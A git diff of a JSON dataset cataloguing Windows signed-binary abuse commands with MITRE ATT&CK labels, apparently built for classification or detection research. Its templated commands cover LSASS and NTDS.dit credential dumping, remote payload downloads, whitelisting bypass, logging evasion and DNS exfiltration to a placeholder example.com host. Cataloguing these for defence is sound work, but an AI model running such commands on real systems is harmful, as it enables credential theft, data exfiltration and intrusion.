+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1127",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":301,
+        "Command":"cdb.exe -c {PATH:.txt} \"{CMD}\"",
+        "Description":"Execute arbitrary commands and binaries using a debugging script (see Resources section for a sample file). Debugging tool included with Windows Debugging Tools.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1127",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":302,
         "Command":"coregen.exe \/L {PATH_ABSOLUTE:.dll} dummy_assembly_name",
         "Description":"Loads the target .DLL in arbitrary path specified with \/L. Binary coregen.exe (Microsoft CoreCLR Native Image Generator) loads exported function GetCLRRuntimeHost from coreclr.dll or from .DLL in arbitrary path. Coregen is located within \"C:\\Program Files (x86)\\Microsoft Silverlight\\5.1.50918.0\\\" or another version of Silverlight. Coregen is signed by Microsoft and bundled with Microsoft Silverlight.",
         "RiskScore":"",
@@ -1716,7 +3624,31 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":144,
+        "ID":303,
+        "Command":"coregen.exe dummy_assembly_name",
+        "Description":"Loads the coreclr.dll in the corgen.exe directory (e.g. C:\\Program Files\\Microsoft Silverlight\\5.1.50918.0). Binary coregen.exe (Microsoft CoreCLR Native Image Generator) loads exported function GetCLRRuntimeHost from coreclr.dll or from .DLL in arbitrary path. Coregen is located within \"C:\\Program Files (x86)\\Microsoft Silverlight\\5.1.50918.0\\\" or another version of Silverlight. Coregen is signed by Microsoft and bundled with Microsoft Silverlight.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1055",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":304,
+        "Command":"coregen.exe \/L {PATH_ABSOLUTE:.dll} dummy_assembly_name",
+        "Description":"Loads the target .DLL in arbitrary path specified with \/L. Since binary is signed it can also be used to bypass application whitelisting solutions. Binary coregen.exe (Microsoft CoreCLR Native Image Generator) loads exported function GetCLRRuntimeHost from coreclr.dll or from .DLL in arbitrary path. Coregen is located within \"C:\\Program Files (x86)\\Microsoft Silverlight\\5.1.50918.0\\\" or another version of Silverlight. Coregen is signed by Microsoft and bundled with Microsoft Silverlight.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":305,
         "Command":"createdump.exe -n -f {PATH:.dmp} {PID}",
         "Description":"Dump process by PID and create a minidump file. If \"-f dump.dmp\" is not specified, the file is created as '%TEMP%\\dump.%p.dmp' where %p is the PID of the target process. Microsoft .NET Runtime Crash Dump Generator (included in .NET Core)",
         "RiskScore":"",
@@ -1728,7 +3660,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":145,
+        "ID":306,
         "Command":"csi.exe {PATH:.cs}",
         "Description":"Use csi.exe to run unsigned C# code. Command line interface included with Visual Studio.",
         "RiskScore":"",
@@ -1740,7 +3672,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":146,
+        "ID":307,
         "Command":"DefaultPack.EXE \/C:\"{CMD}\"",
         "Description":"Use DefaultPack.EXE to execute arbitrary binaries, with added argument support. This binary can be downloaded along side multiple software downloads on the Microsoft website. It gets downloaded when the user forgets to uncheck the option to set Bing as the default search provider.",
         "RiskScore":"",
@@ -1752,7 +3684,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":147,
+        "ID":308,
         "Command":"devinit.exe run -t msi-install -i {REMOTEURL:.msi}",
         "Description":"Downloads an MSI file to C:\\Windows\\Installer and then installs it. Visual Studio 2019 tool",
         "RiskScore":"",
@@ -1764,7 +3696,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":148,
+        "ID":309,
         "Command":"devtoolslauncher.exe LaunchForDeploy {PATH_ABSOLUTE:.exe} \"{CMD:args}\" test",
         "Description":"The above binary will execute other binary. Binary will execute specified binary. Part of VS\/VScode installation.",
         "RiskScore":"",
@@ -1776,7 +3708,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":149,
+        "ID":310,
+        "Command":"devtoolslauncher.exe LaunchForDebug {PATH_ABSOLUTE:.exe} \"{CMD:args}\" test",
+        "Description":"The above binary will execute other binary. Binary will execute specified binary. Part of VS\/VScode installation.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1127",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":311,
         "Command":"dnx.exe {PATH_ABSOLUTE:folder}",
         "Description":"Execute C# code located in the specified folder via 'Program.cs' and 'Project.json' (Note - Requires dependencies) .NET Execution environment file included with .NET.",
         "RiskScore":"",
@@ -1788,7 +3732,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":150,
+        "ID":312,
         "Command":"dotnet.exe {PATH:.dll}",
         "Description":"dotnet.exe will execute any DLL even if applocker is enabled. dotnet.exe comes with .NET Framework",
         "RiskScore":"",
@@ -1800,7 +3744,43 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":151,
+        "ID":313,
+        "Command":"dotnet.exe {PATH:.dll}",
+        "Description":"dotnet.exe will execute any DLL. dotnet.exe comes with .NET Framework",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":314,
+        "Command":"dotnet.exe fsi",
+        "Description":"dotnet.exe will open a console which allows for the execution of arbitrary F# commands dotnet.exe comes with .NET Framework",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1059",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":315,
+        "Command":"dotnet.exe msbuild {PATH:.csproj}",
+        "Description":"dotnet.exe with msbuild (SDK Version) will execute unsigned code dotnet.exe comes with .NET Framework",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":316,
         "Command":"dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"create\" \"quit\" \"quit\"",
         "Description":"dsdbutil supports VSS snapshot creation Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.",
         "RiskScore":"",
@@ -1812,7 +3792,55 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":152,
+        "ID":317,
+        "Command":"dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"mount {GUID}\" \"quit\" \"quit\"",
+        "Description":"Mounting the snapshot with its GUID Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1003.003",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":318,
+        "Command":"dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"delete {GUID}\" \"quit\" \"quit\"",
+        "Description":"Deletes the mount of the snapshot Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1003.003",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":319,
+        "Command":"dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"create\" \"list all\" \"mount 1\" \"quit\" \"quit\"",
+        "Description":"Mounting with snapshot identifier Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1003.003",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":320,
+        "Command":"dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"list all\" \"delete 1\" \"quit\" \"quit\"",
+        "Description":"Deletes the mount of the snapshot Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1003.003",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":321,
         "Command":"dtutil.exe \/FILE {PATH_ABSOLUTE:.source.ext} \/COPY FILE;{PATH_ABSOLUTE:.dest.ext}",
         "Description":"Copy file from source to destination Microsoft command line utility used to manage SQL Server Integration Services packages.",
         "RiskScore":"",
@@ -1824,7 +3852,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":153,
+        "ID":322,
         "Command":"dump64.exe {PID} out.dmp",
         "Description":"Creates a memory dump of the LSASS process. Memory dump tool that comes with Microsoft Visual Studio",
         "RiskScore":"",
@@ -1836,7 +3864,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":154,
+        "ID":323,
         "Command":"DumpMinitool.exe --file {PATH_ABSOLUTE} --processId 1132 --dumpType Full",
         "Description":"Creates a memory dump of the lsass process Dump tool part Visual Studio 2022",
         "RiskScore":"",
@@ -1848,7 +3876,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":155,
+        "ID":324,
         "Command":"Dxcap.exe -c {PATH_ABSOLUTE:.exe}",
         "Description":"Launch specified executable as a subprocess of dxcap.exe. Note that you should have write permissions in the current working directory for the command to succeed; alternatively, add '-file c:\\path\\to\\writable\\location.ext' as first argument. DirectX diagnostics\/debugger included with Visual Studio.",
         "RiskScore":"",
@@ -1860,7 +3888,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":156,
+        "ID":325,
         "Command":"Excel.exe {REMOTEURL}",
         "Description":"Downloads payload from remote server Microsoft Office binary",
         "RiskScore":"",
@@ -1872,7 +3900,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":157,
+        "ID":326,
         "Command":"fsi.exe {PATH:.fsscript}",
         "Description":"Execute F# code via script file 64-bit FSharp (F#) Interpreter included with Visual Studio and DotNet Core SDK.",
         "RiskScore":"",
@@ -1884,7 +3912,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":158,
+        "ID":327,
+        "Command":"fsi.exe",
+        "Description":"Execute F# code via interactive command line 64-bit FSharp (F#) Interpreter included with Visual Studio and DotNet Core SDK.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1059",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":328,
         "Command":"fsianycpu.exe {PATH:.fsscript}",
         "Description":"Execute F# code via script file 32\/64-bit FSharp (F#) Interpreter included with Visual Studio.",
         "RiskScore":"",
@@ -1896,7 +3936,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":159,
+        "ID":329,
+        "Command":"fsianycpu.exe",
+        "Description":"Execute F# code via interactive command line 32\/64-bit FSharp (F#) Interpreter included with Visual Studio.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1059",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":330,
         "Command":"Mftrace.exe {PATH:.exe}",
         "Description":"Launch specified executable as a subprocess of Mftrace.exe. Trace log generation tool for Media Foundation Tools.",
         "RiskScore":"",
@@ -1908,7 +3960,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":160,
+        "ID":331,
         "Command":"Microsoft.NodejsTools.PressAnyKey.exe normal 1 {PATH:.exe}",
         "Description":"Launch specified executable as a subprocess of Microsoft.NodejsTools.PressAnyKey.exe. Part of the NodeJS Visual Studio tools.",
         "RiskScore":"",
@@ -1920,7 +3972,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":161,
+        "ID":332,
         "Command":"MSAccess.exe {REMOTEURL}",
         "Description":"Downloads payload from remote server Microsoft Office component",
         "RiskScore":"",
@@ -1932,7 +3984,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":162,
+        "ID":333,
         "Command":"msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=\"{PATH_ABSOLUTE:.bat}\"",
         "Description":"Launch .bat file via msdeploy.exe. Microsoft tool used to deploy Web Applications.",
         "RiskScore":"",
@@ -1944,7 +3996,31 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":163,
+        "ID":334,
+        "Command":"msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=\"{PATH_ABSOLUTE:.bat}\"",
+        "Description":"Launch .bat file via msdeploy.exe. Microsoft tool used to deploy Web Applications.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":335,
+        "Command":"msdeploy.exe -verb:sync -source:filePath={PATH_ABSOLUTE:.source.ext} -dest:filePath={PATH_ABSOLUTE:.dest.ext}",
+        "Description":"Copy file from source to destination. Microsoft tool used to deploy Web Applications.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1105",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":336,
         "Command":"MsoHtmEd.exe {REMOTEURL}",
         "Description":"Downloads payload from remote server Microsoft Office component",
         "RiskScore":"",
@@ -1956,7 +4032,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":164,
+        "ID":337,
         "Command":"mspub.exe {REMOTEURL}",
         "Description":"Downloads payload from remote server Microsoft Publisher",
         "RiskScore":"",
@@ -1968,7 +4044,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":165,
+        "ID":338,
         "Command":"msxsl.exe {PATH:.xml} {PATH:.xsl}",
         "Description":"Run COM Scriptlet code within the script.xsl file (local). Command line utility used to perform XSL transformations.",
         "RiskScore":"",
@@ -1980,7 +4056,67 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":166,
+        "ID":339,
+        "Command":"msxsl.exe {PATH:.xml} {PATH:.xsl}",
+        "Description":"Run COM Scriptlet code within the script.xsl file (local). Command line utility used to perform XSL transformations.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1220",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":340,
+        "Command":"msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl}",
+        "Description":"Run COM Scriptlet code within the shellcode.xml(xsl) file (remote). Command line utility used to perform XSL transformations.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1220",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":341,
+        "Command":"msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xml}",
+        "Description":"Run COM Scriptlet code within the shellcode.xml(xsl) file (remote). Command line utility used to perform XSL transformations.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1220",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":342,
+        "Command":"msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}",
+        "Description":"Using remote XML and XSL files, save the transformed XML file to disk. Command line utility used to perform XSL transformations.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1105",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":343,
+        "Command":"msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}:ads-name",
+        "Description":"Using remote XML and XSL files, save the transformed XML file to an Alternate Data Stream (ADS). Command line utility used to perform XSL transformations.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1564",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":344,
         "Command":"ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full c:\\\" q q",
         "Description":"Dump NTDS.dit into folder Command line utility used to export Active Directory.",
         "RiskScore":"",
@@ -1992,7 +4128,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":167,
+        "ID":345,
         "Command":"OpenConsole.exe {PATH:.exe}",
         "Description":"Execute specified process with OpenConsole.exe as parent process Console Window host for Windows Terminal",
         "RiskScore":"",
@@ -2004,7 +4140,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":168,
+        "ID":346,
         "Command":"Powerpnt.exe {REMOTEURL}",
         "Description":"Downloads payload from remote server Microsoft Office binary.",
         "RiskScore":"",
@@ -2016,7 +4152,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":169,
+        "ID":347,
         "Command":"procdump.exe -md {PATH:.dll} explorer.exe",
         "Description":"Loads the specified DLL where DLL is configured with a 'MiniDumpCallbackRoutine' exported function. Valid process must be provided as dump still created. SysInternals Memory Dump Tool",
         "RiskScore":"",
@@ -2028,7 +4164,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":170,
+        "ID":348,
+        "Command":"procdump.exe -md {PATH:.dll} foobar",
+        "Description":"Loads the specified DLL where configured with DLL_PROCESS_ATTACH execution, process argument can be arbitrary. SysInternals Memory Dump Tool",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1202",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":349,
         "Command":"ProtocolHandler.exe {REMOTEURL}",
         "Description":"Downloads payload from remote server Microsoft Office binary",
         "RiskScore":"",
@@ -2040,7 +4188,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":171,
+        "ID":350,
         "Command":"rcsi.exe {PATH:.csx}",
         "Description":"Use embedded C# within the csx script to execute the code. Non-Interactive command line inerface included with Visual Studio.",
         "RiskScore":"",
@@ -2052,7 +4200,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":172,
+        "ID":351,
+        "Command":"rcsi.exe {PATH:.csx}",
+        "Description":"Use embedded C# within the csx script to execute the code. Non-Interactive command line inerface included with Visual Studio.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1127",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":352,
         "Command":"Remote.exe \/s {PATH:.exe} anythinghere",
         "Description":"Spawns specified executable as a child process of remote.exe Debugging tool included with Windows Debugging Tools",
         "RiskScore":"",
@@ -2064,7 +4224,31 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":173,
+        "ID":353,
+        "Command":"Remote.exe \/s {PATH:.exe} anythinghere",
+        "Description":"Spawns specified executable as a child process of remote.exe Debugging tool included with Windows Debugging Tools",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1127",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":354,
+        "Command":"Remote.exe \/s {PATH_SMB:.exe} anythinghere",
+        "Description":"Run a remote file Debugging tool included with Windows Debugging Tools",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1127",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":355,
         "Command":"sqldumper.exe 464 0 0x0110",
         "Description":"Dump process by PID and create a dump file (Appears to create a dump file called SQLDmprXXXX.mdmp). Debugging utility included with Microsoft SQL.",
         "RiskScore":"",
@@ -2076,7 +4260,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":174,
+        "ID":356,
+        "Command":"sqldumper.exe 540 0 0x01100:40",
+        "Description":"0x01100:40 flag will create a Mimikatz compatible dump file. Debugging utility included with Microsoft SQL.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1003.001",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":357,
         "Command":"Sqlps.exe -noprofile",
         "Description":"Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging. Tool included with Microsoft SQL Server that loads SQL Server cmdlets. Microsoft SQL Server\\100 and 110 are Powershell v2. Microsoft SQL Server\\120 and 130 are Powershell version 4. Replaced by SQLToolsPS.exe in SQL Server 2016, but will be included with installation for compatability reasons.",
         "RiskScore":"",
@@ -2088,7 +4284,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":175,
+        "ID":358,
         "Command":"SQLToolsPS.exe -noprofile -command Start-Process {PATH:.exe}",
         "Description":"Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging. Tool included with Microsoft SQL that loads SQL Server cmdlts. A replacement for sqlps.exe. Successor to sqlps.exe in SQL Server 2016+.",
         "RiskScore":"",
@@ -2100,7 +4296,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":176,
+        "ID":359,
         "Command":"squirrel.exe --download {REMOTEURL}",
         "Description":"The above binary will go to url and look for RELEASES file and download the nuget package. Binary to update the existing installed Nuget\/squirrel package. Part of Microsoft Teams installation.",
         "RiskScore":"",
@@ -2112,7 +4308,55 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":177,
+        "ID":360,
+        "Command":"squirrel.exe --update {REMOTEURL}",
+        "Description":"The above binary will go to url and look for RELEASES file, download and install the nuget package. Binary to update the existing installed Nuget\/squirrel package. Part of Microsoft Teams installation.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":361,
+        "Command":"squirrel.exe --update {REMOTEURL}",
+        "Description":"The above binary will go to url and look for RELEASES file, download and install the nuget package. Binary to update the existing installed Nuget\/squirrel package. Part of Microsoft Teams installation.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":362,
+        "Command":"squirrel.exe --updateRollback={REMOTEURL}",
+        "Description":"The above binary will go to url and look for RELEASES file, download and install the nuget package. Binary to update the existing installed Nuget\/squirrel package. Part of Microsoft Teams installation.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":363,
+        "Command":"squirrel.exe --updateRollback={REMOTEURL}",
+        "Description":"The above binary will go to url and look for RELEASES file, download and install the nuget package. Binary to update the existing installed Nuget\/squirrel package. Part of Microsoft Teams installation.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":364,
         "Command":"te.exe {PATH:.wsc}",
         "Description":"Run COM Scriptlets (e.g. VBScript) by calling a Windows Script Component (WSC) file. Testing tool included with Microsoft Test Authoring and Execution Framework (TAEF).",
         "RiskScore":"",
@@ -2124,7 +4368,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":178,
+        "ID":365,
+        "Command":"te.exe {PATH:.dll}",
+        "Description":"Execute commands from a DLL file with Test Authoring and Execution Framework (TAEF) tests. See resources section for required structures. Testing tool included with Microsoft Test Authoring and Execution Framework (TAEF).",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1127",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":366,
         "Command":"teams.exe",
         "Description":"Generate JavaScript payload and package.json, and save to \"%LOCALAPPDATA%\\\\Microsoft\\\\Teams\\\\current\\\\app\\\\\" before executing. Electron runtime binary which runs the Teams application",
         "RiskScore":"",
@@ -2136,7 +4392,31 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":179,
+        "ID":367,
+        "Command":"teams.exe",
+        "Description":"Generate JavaScript payload and package.json, archive in ASAR file and save to \"%LOCALAPPDATA%\\\\Microsoft\\\\Teams\\\\current\\\\app.asar\" before executing. Electron runtime binary which runs the Teams application",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.015",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":368,
+        "Command":"teams.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD} &&\"",
+        "Description":"Teams spawns cmd.exe as a child process of teams.exe and executes the ping command Electron runtime binary which runs the Teams application",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.015",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":369,
         "Command":"TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000",
         "Description":"Sends DNS query for open connection to any host, enabling exfiltration over DNS TestWindowRemoteAgent.exe is the command-line tool to establish RPC",
         "RiskScore":"",
@@ -2148,7 +4428,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":180,
+        "ID":370,
         "Command":"Tracker.exe \/d {PATH:.dll} \/c C:\\Windows\\write.exe",
         "Description":"Use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions. Tool included with Microsoft .Net Framework.",
         "RiskScore":"",
@@ -2160,7 +4440,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":181,
+        "ID":371,
+        "Command":"Tracker.exe \/d {PATH:.dll} \/c C:\\Windows\\write.exe",
+        "Description":"Use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions. Tool included with Microsoft .Net Framework.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1127",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":372,
         "Command":"Update.exe --download {REMOTEURL}",
         "Description":"The above binary will go to url and look for RELEASES file and download the nuget package. Binary to update the existing installed Nuget\/squirrel package. Part of Microsoft Teams installation.",
         "RiskScore":"",
@@ -2172,7 +4464,151 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":182,
+        "ID":373,
+        "Command":"Update.exe --update={REMOTEURL}",
+        "Description":"The above binary will go to url and look for RELEASES file, download and install the nuget package. Binary to update the existing installed Nuget\/squirrel package. Part of Microsoft Teams installation.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":374,
+        "Command":"Update.exe --update={REMOTEURL}",
+        "Description":"The above binary will go to url and look for RELEASES file, download and install the nuget package. Binary to update the existing installed Nuget\/squirrel package. Part of Microsoft Teams installation.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":375,
+        "Command":"Update.exe --update={PATH_SMB:folder}",
+        "Description":"The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA. Binary to update the existing installed Nuget\/squirrel package. Part of Microsoft Teams installation.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":376,
+        "Command":"Update.exe --update={PATH_SMB:folder}",
+        "Description":"The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA. Binary to update the existing installed Nuget\/squirrel package. Part of Microsoft Teams installation.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
